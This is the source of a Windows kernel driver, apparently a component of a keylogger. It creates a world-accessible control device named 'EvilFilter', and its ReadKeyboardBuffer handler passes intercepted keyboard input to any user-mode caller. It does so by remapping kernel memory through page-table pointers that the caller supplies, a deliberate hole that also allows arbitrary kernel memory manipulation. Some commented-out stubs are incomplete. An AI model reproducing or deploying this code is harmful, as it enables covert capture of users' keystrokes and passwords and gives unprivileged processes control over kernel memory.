#include <ntddk.h>
#include <wdf.h>
//#include <ntddkbd.h>   
#include <ControlDevice.h>
#include <PageTableManipulation.h>
#include <SharedHeader.h>

WDFDEVICE ControlDevice;
extern PKEYBOARD_INPUT_DATA keyboardBuffer;



/*
NTSTATUS ObReferenceObjectByHandle(
_In_       HANDLE Handle,
_In_       ACCESS_MASK DesiredAccess,
_In_opt_   POBJECT_TYPE ObjectType,
_In_       KPROCESSOR_MODE AccessMode,
_Out_      PVOID *Object,
_Out_opt_  POBJECT_HANDLE_INFORMATION HandleInformation
);*/


/** /
VOID play(HANDLE handle) {

	NTSTATUS status;
	extern POBJECT_TYPE  *PsProcessType;
	PEPROCESS peProcess;
	POBJECT_TYPE peProcessObjectType = ObGetObjectType(peProcess);

	status = ObReferenceObjectByHandle(handle, GENERIC_READ, NULL, UserMode, &peProcess, NULL);


}


VOID play2() {
	PEPROCESS peProcess = IoGetCurrentProcess();
	IoGetProcessId 

}
/**/


NTSTATUS CreateControlDevice(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath) {
	KdPrint(("CreateControlDevice IRQ Level [%u]", KeGetCurrentIrql()));

	NTSTATUS status;
	PWDFDEVICE_INIT ControlDeviceInit;
	WDF_OBJECT_ATTRIBUTES ControlDeviceAttributes;
	WDFDRIVER Driver;
	WDF_DRIVER_CONFIG       DriverConfig;
	WDF_IO_QUEUE_CONFIG         ioQueueConfig;
	WDFQUEUE                    queue;

	WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&ControlDeviceAttributes, CONTROL_DEVICE_EXTENSION);
	WDF_DRIVER_CONFIG_INIT(&DriverConfig, WDF_NO_EVENT_CALLBACK);

	//WDF_OBJECT_ATTRIBUTES_INIT(&Attributes);
	// TODO: Attributes.EvtCleanupCallback = EvtDriverContextCleanup;

	status = WdfDriverCreate(DriverObject, RegistryPath, &ControlDeviceAttributes, &DriverConfig, &Driver);

	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDriverCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDriverCreate Succeededx\n"));
	}

	ControlDeviceInit = WdfControlDeviceInitAllocate(Driver, &SDDL_DEVOBJ_SYS_ALL_ADM_RWX_WORLD_RWX_RES_RWX);

	DECLARE_CONST_UNICODE_STRING(ntDeviceName, L"\\Device\\EvilFilter");
	DECLARE_CONST_UNICODE_STRING(symbolicLinkName, L"\\DosDevices\\EvilFilter");

	status = WdfDeviceInitAssignName(ControlDeviceInit, &ntDeviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceInitAssignName FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceInitAssignName Succeeded\n"));
	}

	//WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&ControlDeviceAttributes, CONTROL_DEVICE_EXTENSION);
	status = WdfDeviceCreate(&ControlDeviceInit, &ControlDeviceAttributes, &ControlDevice);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceCreate Succeeded\n"));
	}

	status = WdfDeviceCreateSymbolicLink(ControlDevice, &symbolicLinkName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceCreateSymbolicLink FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceCreateSymbolicLink Succeeded\n"));
	}

	WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig, WdfIoQueueDispatchSequential);
	ioQueueConfig.DefaultQueue = TRUE;
	ioQueueConfig.EvtIoDefault = ReadKeyboardBuffer;
	status = WdfIoQueueCreate(ControlDevice, &ioQueueConfig, WDF_NO_OBJECT_ATTRIBUTES, &queue); // pointer to default queue

	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfIoQueueCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfIoQueueCreate Succeeded\n"));
	}
	WdfControlFinishInitializing(ControlDevice);

	KdPrint(("WdfControlFinishInitializing finished\n"));

	return status;
	// ControlDevice
}

_Use_decl_annotations_
VOID ReadKeyboardBuffer(_In_ WDFQUEUE Queue, _In_ WDFREQUEST Request) {

	UNREFERENCED_PARAMETER(Queue);

	KdPrint(("ReadKeyboardBuffer IRQ Level [%u]\n", KeGetCurrentIrql()));

	NTSTATUS                  status;
	//	WDF_REQUEST_PARAMETERS    params;
	WDFMEMORY memoryHandle;
	//PVOID memoryPointer;
	size_t Length;

	//WDF_REQUEST_PARAMETERS_INIT(&params);
	//WdfRequestGetParameters(Request, &params);
	if (keyboardBuffer) {


		Length = sizeof(SHARED_MEMORY_STRUCT);

		WDF_OBJECT_ATTRIBUTES  attributes;
		WDF_OBJECT_ATTRIBUTES_INIT(&attributes);


		status = WdfRequestRetrieveOutputMemory(Request, &memoryHandle);	

		if (!NT_SUCCESS(status)) {
			KdPrint(("ReadKeyboardBuffer Could not create memory buffer 0x%x\n", status));
			WdfVerifierDbgBreakPoint();
			WdfRequestCompleteWithInformation(Request, status, 0L);
			return;
		}
		else {
			KdPrint(("ReadKeyboardBuffer memory buffer created.\n"));
		}

		PSHARED_MEMORY_STRUCT userSharedMemory = (PSHARED_MEMORY_STRUCT)WdfMemoryGetBuffer(memoryHandle, NULL);
		if (!(userSharedMemory)) {
			KdPrint(("ReadKeyboardBuffer WdfMemoryGetBuffer failed:\n"));
			WdfVerifierDbgBreakPoint();
			WdfRequestCompleteWithInformation(Request, status, 0L);
			return;
		}
		else {

			CHAR instruction = userSharedMemory->instruction;
			if (instruction) {
				KdPrint(("ReadKeyboardBuffer Client instruction is [%c]\n", instruction));
				if (instruction == 'O') {
					INDEX kmdfOffset = (INDEX)keyboardBuffer & 0x0fff;
					KdPrint(("Sending address [0x%lx] offset [0x%lx] to user\n", (ULONG)keyboardBuffer, kmdfOffset));
					userSharedMemory->offset = kmdfOffset;
					status = STATUS_SUCCESS;
				}
				else if (instruction == 'E') {
					GENERIC_POINTER  clientMemory = userSharedMemory->ClientMemory;
					PPDE clientPpde = (PPDE)userSharedMemory->PageDirectory;
					PPTE clientPpte = (PPTE)userSharedMemory->PageTable;
					KdPrint(("ReadKeyboardBuffer usermem is  [0x%lx] Page Directory is [0x%lx] Page Table is [0x%lx]\n", clientMemory, clientPpde, clientPpte));

					status = Remap(clientMemory, clientPpde, clientPpte, keyboardBuffer);
				}


			}
			else {
				KdPrint(("ReadKeyboardBuffer userPageTable is NULL\n"));
			}
		}

	}
	else {
		KdPrint(("keyboardBuffer not yet set....plz wait\n"));
		Length = 0;
		status = STATUS_RESOURCE_DATA_NOT_FOUND;
	}
	// Set transfer information
	WdfRequestSetInformation(Request, (ULONG_PTR)Length);
	WdfRequestComplete(Request, status);
	return;

}
